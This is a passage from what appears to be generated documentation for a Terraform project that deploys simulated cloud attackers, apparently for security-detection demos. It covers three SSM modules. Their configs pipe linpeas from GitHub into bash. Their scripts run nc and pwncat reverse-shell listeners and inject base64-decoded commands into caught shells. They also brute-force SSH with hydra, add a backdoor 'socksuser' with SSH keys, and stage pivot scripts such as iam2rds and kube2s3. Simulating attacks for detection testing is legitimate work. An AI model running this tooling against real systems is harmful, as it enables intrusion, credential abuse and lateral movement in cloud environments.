| attacker-ssm-responder-reverse-shell                                       | ./modules/ssm/responder-reverse-shell                          | ssm_exec_responder_reverse_shell           | context.aws.ssm.attacker.responder.reverse_shell                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell                          | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    base64\_command\_payload = base64encode\(var\.inputs\[&quot;payload&quot;\]\)<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        screen \-S netcat \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/netcat\.log<br/>        screen \-d \-L \-Logfile /tmp/netcat\.log \-S netcat \-m nc \-vv \-nl $\{local\.listen\_ip\} $\{local\.listen\_port\}<br/>        screen \-S netcat \-X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started\.\.&quot;<br/>        until tail /tmp/netcat\.log \| grep \-m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection\.\.\.&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &\#x27;sending screen command: $\{var\.inputs\[&quot;payload&quot;\]\}&\#x27;;<br/>        screen \-S netcat \-p 0 \-X stuff &quot;echo &\#x27;$\{local\.base64\_command\_payload\}&\#x27; \| base64 \-d \| /bin/bash \-^M&quot;<br/>        log &quot;responder started\.\.\.&quot;<br/>        log &\#x27;waiting 10 minutes\.\.\.&\#x27;;<br/>        sleep 600<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| attacker-ssm-responder-reverse-shell-multistage                            | ./modules/ssm/responder-reverse-shell-multistage               | ssm_exec_reverse_shell_multistage_attacker | context.aws.ssm.attacker.responder.reverse_shell_multistage               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "iam2rds_role_name": "rds_user_access_role_ciemdemo",<br/>                            "iam2rds_session_name": "attacker-session",<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell-multistage               | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    attack\_dir = &quot;/pwncat&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    PWNCAT\_LOG=&quot;/tmp/pwncat\.log&quot;<br/>    PWNCAT\_SESSION=&quot;pwncat&quot;<br/>    PWNCAT\_SESSION\_LOCK=&quot;/tmp/pwncat\_session\.lock&quot;<br/>    if \[ \-e &quot;$PWNCAT\_SESSION\_LOCK&quot; \]  &amp;&amp; screen \-ls \| grep \-q &quot;$PWNCAT\_SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT\_SESSION\_LOCK exists and pwncat screen session running\. Skipping setup\.&quot;<br/>    else<br/>        rm \-f &quot;$PWNCAT\_SESSION\_LOCK&quot;<br/>        log &quot;Session lock doesn&\#x27;t exist and screen session not runing\. Continuing\.\.\.&quot;<br/>        log &quot;setting up reverse shell listener: $\{local\.listen\_ip\}:$\{local\.listen\_port\}&quot;<br/>        screen \-S $PWNCAT\_SESSION \-X quit<br/>        screen \-wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm \-rf $\{local\.attack\_dir\}<br/>        mkdir \-p $\{local\.attack\_dir\}/plugins $\{local\.attack\_dir\}/resources<br/>        cd $\{local\.attack\_dir\}<br/>        echo $\{base64gzip\(local\.listener\)\} \| base64 \-d \| gunzip &gt; listener\.py<br/>        echo $\{base64gzip\(local\.responder\)\} \| base64 \-d \| gunzip &gt; plugins/responder\.py<br/>        echo $\{base64gzip\(local\.instance2rds\)\} \| base64 \-d \| gunzip &gt; resources/instance2rds\.sh<br/>        echo $\{base64gzip\(local\.iam2rds\)\} \| base64 \-d \| gunzip &gt; resources/iam2rds\.sh<br/>        echo $\{base64gzip\(local\.azureiam2azuresql\)\} \| base64 \-d \| gunzip &gt; resources/azureiam2azuresql\.sh<br/>        echo $\{base64gzip\(local\.gcpiam2cloudsql\)\} \| base64 \-d \| gunzip &gt; resources/gcpiam2cloudsql\.sh<br/>        echo $\{base64gzip\(local\.scan2kubeshell\)\} \| base64 \-d \| gunzip &gt; resources/scan2kubeshell\.sh<br/>        echo $\{base64gzip\(local\.kube2s3\)\} \| base64 \-d \| gunzip &gt; resources/kube2s3\.sh <br/>        echo $\{base64gzip\(local\.iam2enum\)\} \| base64 \-d \| gunzip &gt; resources/iam2enum\.sh<br/>        log &quot;installing required python3\.9\.\.\.&quot;<br/>        apt\-get install \-y python3\.9 python3\.9\-venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3\.9 get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module\.\.\.&quot;<br/>        sleep 5<br/>        python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3\.9 \-m pip install \-U pwncat\-cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module\.\.\.&quot;<br/>        sleep 5<br/>        if \! \[ \-e /home/socksuser/\.ssh/socksuser\_key \]; then<br/>            log &quot;adding tunneled port scanning user \- socksuser\.\.\.&quot;<br/>            adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;socksuser&quot; \|\| log &quot;socksuser user already exists&quot;<br/>            log &quot;adding ssh keys for socks user\.\.\.&quot;<br/>            mkdir \-p /home/socksuser/\.ssh 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            ssh\-keygen \-t rsa \-N &\#x27;&\#x27; \-b 4096 \-f /home/socksuser/\.ssh/socksuser\_key 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            cat /home/socksuser/\.ssh/socksuser\_key\.pub &gt;&gt; /home/socksuser/\.ssh/authorized\_keys 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            chown \-R socksuser:socksuser /home/socksuser<br/>            chmod 600 /home/socksuser/\.ssh/authorized\_keys 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            log &quot;socksuser setup complete\.\.\.&quot;<br/>        fi<br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>        while true; do<br/>            for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$PWNCAT\_LOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>            mv $PWNCAT\_LOG &quot;$PWNCAT\_LOG\.1&quot; 2&gt;/dev/null \|\| true<br/>            log &quot;starting background process via screen\.\.\.&quot;<br/>            screen \-S $PWNCAT\_SESSION \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile $PWNCAT\_LOG \-S $PWNCAT\_SESSION \-m /bin/bash \-c &quot;cd $\{local\.attack\_dir\} &amp;&amp; python3\.9 listener\.py \-\-port=\\&quot;$\{var\.inputs\[&quot;reverse\_shell\_port&quot;\]\}\\&quot; \-\-host=\\&quot;$\{var\.inputs\[&quot;reverse\_shell\_host&quot;\]\}\\&quot; \-\-payload=\\&quot;$\{var\.inputs\[&quot;payload&quot;\]\}\\&quot;&quot;<br/>            screen \-S $PWNCAT\_SESSION \-X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;Checking for listener\.\.\.&quot;<br/>            TIMEOUT=1800<br/>            START\_TIME=$\(date \+%s\)<br/>            while true; do<br/>                CURRENT\_TIME=$\(date \+%s\)<br/>                ELAPSED\_TIME=$\(\(CURRENT\_TIME \- START\_TIME\)\)<br/>                if grep &quot;listener created&quot; $PWNCAT\_LOG; then<br/>                    log &quot;Found listener created log in $PWNCAT\_LOG \- checking for port response&quot;<br/>                    while \! nc \-z \-w 5 \-vv 127\.0\.0\.1 $\{local\.listen\_port\} &gt; /dev/null; do<br/>                        log &quot;failed check \- waiting for pwncat port response: 127\.0\.0\.1:$\{local\.listen\_port\}&quot;;<br/>                        sleep 30;<br/>                        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                            rm \-f /tmp/payload\_$SCRIPTNAME<br/>                            break 3<br/>                        fi<br/>                    done;<br/>                    log &quot;Sucessfully connected to 127\.0\.0\.1:$\{local\.listen\_port\}&quot;<br/>                    break<br/>                fi<br/>                if \[ $ELAPSED\_TIME \-gt $TIMEOUT \]; then<br/>                    log &quot;Failed to find listener created log for pwncat \- timeout after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>            done<br/>            log &quot;responder started\.&quot;<br/>            log &quot;starting sleep for 30 minutes \- blocking new tasks while accepting connections\.\.\.&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete \- checking for running sessions\.\.\.&quot;<br/>            while \[ \-e &quot;$PWNCAT\_SESSION\_LOCK&quot; \]  &amp;&amp; screen \-ls \| grep \-q &quot;$PWNCAT\_SESSION&quot;; do<br/>                log &quot;pwncat session still running \- waiting before restart\.\.\.&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found \- continuing\.\.\.&quot;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    fi<br/>    log &quot;done\.&quot;<br/>    EOT<br/><br/>    listener        = file\(&quot;$\{path\.module\}/resources/listener\.py&quot;\)<br/>    responder       = file\(&quot;$\{path\.module\}/resources/responder\.py&quot;\)<br/>    instance2rds    = templatefile\(<br/>                                &quot;$\{path\.module\}/resources/instance2rds\.sh&quot;, <br/>                                \{<br/>                                    region = var\.inputs\[&quot;region&quot;\],<br/>                                    environment = var\.inputs\[&quot;environment&quot;\],<br/>                                    deployment = var\.inputs\[&quot;deployment&quot;\]<br/>                                \}<br/>                            \)<br/><br/>    iam2rds         = templatefile\(<br/>                                &quot;$\{path\.module\}/resources/iam2rds\.sh&quot;, <br/>                                \{<br/>                                    region = var\.inputs\[&quot;region&quot;\],<br/>                                    environment = var\.inputs\[&quot;environment&quot;\],<br/>                                    deployment = var\.inputs\[&quot;deployment&quot;\],<br/>                                    iam2rds\_role\_name = var\.inputs\[&quot;iam2rds\_role\_name&quot;\]<br/>                                    iam2rds\_session\_name = &quot;$\{var\.inputs\[&quot;iam2rds\_session\_name&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                \}<br/>                            \)<br/>    <br/>    iam2enum = file\(&quot;$\{path\.module\}/resources/iam2enum\.sh&quot;\)<br/>                            <br/>    azureiam2azuresql = file\(&quot;$\{path\.module\}/resources/azureiam2azuresql\.sh&quot;\)                            <br/><br/>    gcpiam2cloudsql = file\(&quot;$\{path\.module\}/resources/gcpiam2cloudsql\.sh&quot;\)<br/><br/>    scan2kubeshell = file\(&quot;$\{path\.module\}/resources/scan2kubeshell\.sh&quot;\)<br/>    <br/>    kube2s3 = file\(&quot;$\{path\.module\}/resources/kube2s3\.sh&quot;\)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;proxychains4 nmap hydra python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if \! command \-v proxychains4 &gt; /dev/null \|\| \! command \-v hydra &gt; /dev/null \|\| \! command \-v hydra &gt; /dev/null; then<br/>            yum update \-y<br/>            yum install \-y git<br/>            yum groupinstall \-y &\#x27;Development Tools&\#x27;<br/>            \# proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github\.com/rofl0r/proxychains\-ng<br/>            cd proxychains\-ng<br/>            \./configure &amp;&amp; make &amp;&amp; make install<br/>            make install\-config<br/>            \# hydra<br/>            cd /usr/local/src<br/>            git clone https://github\.com/vanhauser\-thc/thc\-hydra<br/>            cd thc\-hydra<br/>            \./configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;nmap python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_instance2rds\.sh&quot;<br/>                content = base64encode\(local\.instance2rds\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_iam2rds\.sh&quot;<br/>                content = base64encode\(local\.iam2rds\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_scan2kubeshell\.sh&quot;<br/>                content = base64encode\(local\.scan2kubeshell\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_kube2s3\.sh&quot;<br/>                content = base64encode\(local\.kube2s3\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_gcpiam2cloudsql\.sh&quot;<br/>                content = base64encode\(local\.gcpiam2cloudsql\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_iam2enum\.sh&quot;<br/>                content = base64encode\(local\.iam2enum\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-ssm-connect-ssh-shell-multistage                                  | ./modules/ssm/connect-ssh-shell-multistage                     | ssm_connect_ssh_shell_multistage_attacker  | context.aws.ssm.attacker.connect.ssh_shell_multistage                     | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "connect": {<br/>                        "ssh_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "password_list": "/tmp/hydra-passwords.txt",<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null,<br/>                            "reverse_shell_port": 4444,<br/>                            "target_ip": null,<br/>                            "target_port": 22,<br/>                            "task": "custom",<br/>                            "user_list": "/tmp/hydra-users.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-ssh-shell-multistage                     | <pre>locals \{<br/>    attack\_dir = &quot;/pwncat\_connector&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    PWNCAT\_LOG=&quot;/tmp/pwncat\_connector\.log&quot;<br/>    PWNCAT\_SESSION=&quot;pwncat\_connector&quot;<br/>    PWNCAT\_SESSION\_LOCK=&quot;/tmp/pwncat\_connector\_session\.lock&quot;<br/>    if \[ \-e &quot;$PWNCAT\_SESSION\_LOCK&quot; \]  &amp;&amp; screen \-ls \| grep \-q &quot;$PWNCAT\_SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT\_SESSION\_LOCK exists and $PWNCAT\_SESSION screen session running\. Skipping setup\.&quot;<br/>    else<br/>        rm \-f &quot;$PWNCAT\_SESSION\_LOCK&quot;<br/>        log &quot;Session lock doesn&\#x27;t exist and screen session not runing\. Continuing\.\.\.&quot;<br/>        screen \-S $PWNCAT\_SESSION \-X quit<br/>        screen \-wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm \-rf $\{local\.attack\_dir\}<br/>        mkdir \-p $\{local\.attack\_dir\}/plugins $\{local\.attack\_dir\}/resources<br/>        cd $\{local\.attack\_dir\}<br/>        echo $\{base64gzip\(local\.connector\)\} \| base64 \-d \| gunzip &gt; connector\.py<br/>        echo $\{base64gzip\(local\.scan\)\} \| base64 \-d \| gunzip &gt; scan\.sh<br/>        log &quot;installing required python3\.9\.\.\.&quot;<br/>        apt\-get install \-y python3\.9 python3\.9\-venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3\.9 get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module\.\.\.&quot;<br/>        sleep 5<br/>        python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3\.9 \-m pip install \-U pwncat\-cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module\.\.\.&quot;<br/>        sleep 5<br/>        log &quot;checking for user and password list before starting\.\.\.&quot;<br/>        while \! \[ \-f &quot;$\{var\.inputs\[&quot;user\_list&quot;\]\}&quot; \] \|\| \! \[ \-f &quot;$\{var\.inputs\[&quot;password\_list&quot;\]\}&quot; \]; do<br/>            log &quot;waiting for $\{var\.inputs\[&quot;user\_list&quot;\]\} and $\{var\.inputs\[&quot;password\_list&quot;\]\}\.\.\.&quot;<br/>            sleep 30<br/>        done<br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>        while true; do<br/>            for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$PWNCAT\_LOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>            mv $PWNCAT\_LOG &quot;$PWNCAT\_LOG\.1&quot; 2&gt;/dev/null \|\| true<br/>            log &quot;starting background process via screen\.\.\.&quot;<br/>            screen \-S $PWNCAT\_SESSION \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile $PWNCAT\_LOG \-S $PWNCAT\_SESSION \-m /bin/bash \-c &quot;cd $\{local\.attack\_dir\} &amp;&amp; python3\.9 connector\.py \-\-target\-ip=\\&quot;$\{var\.inputs\[&quot;target\_ip&quot;\]\}\\&quot; \-\-target\-port=\\&quot;$\{var\.inputs\[&quot;target\_port&quot;\]\}\\&quot; \-\-user\-list=\\&quot;$\{var\.inputs\[&quot;user\_list&quot;\]\}\\&quot; \-\-password\-list=\\&quot;$\{var\.inputs\[&quot;password\_list&quot;\]\}\\&quot; \-\-task=\\&quot;$\{var\.inputs\[&quot;task&quot;\]\}\\&quot; \-\-payload=\\&quot;$\{base64encode\(var\.inputs\[&quot;payload&quot;\]\)\}\\&quot; \-\-reverse\-shell\-host=\\&quot;$\{var\.inputs\[&quot;reverse\_shell\_host&quot;\]\}\\&quot;  \-\-reverse\-shell\-port=\\&quot;$\{var\.inputs\[&quot;reverse\_shell\_port&quot;\]\}\\&quot;&quot;<br/>            screen \-S $PWNCAT\_SESSION \-X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;connector started\.&quot;<br/>            log &quot;starting sleep for 30 minutes \- blocking new tasks while accepting connections\.\.\.&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete \- checking for running sessions\.\.\.&quot;<br/>            while \[ \-e &quot;$PWNCAT\_SESSION\_LOCK&quot; \]  &amp;&amp; screen \-ls \| grep \-q &quot;$PWNCAT\_SESSION&quot;; do<br/>                log &quot;pwncat session still running \- waiting before restart\.\.\.&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found \- continuing\.\.\.&quot;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    fi<br/>    log &quot;done\.&quot;<br/>    EOT<br/><br/>    connector        = file\(<br/>                                &quot;$\{path\.module\}/resources/connector\.py&quot;, <br/>                            \)<br/>    <br/>    scan            = file\(<br/>                                &quot;$\{path\.module\}/resources/scan\.sh&quot;, <br/>                            \)<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;proxychains4 nmap hydra python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if \! command \-v proxychains4 &gt; /dev/null \|\| \! command \-v hydra &gt; /dev/null \|\| \! command \-v hydra &gt; /dev/null; then<br/>            yum update \-y<br/>            yum install \-y git<br/>            yum groupinstall \-y &\#x27;Development Tools&\#x27;<br/>            \# proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github\.com/rofl0r/proxychains\-ng<br/>            cd proxychains\-ng<br/>            \./configure &amp;&amp; make &amp;&amp; make install<br/>            make install\-config<br/>            \# hydra<br/>            cd /usr/local/src<br/>            git clone https://github\.com/vanhauser\-thc/thc\-hydra<br/>            cd thc\-hydra<br/>            \./configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;nmap python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_scan\.sh&quot;<br/>                content = base64encode\(local\.scan\)<br/>            \},<br/>        \]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |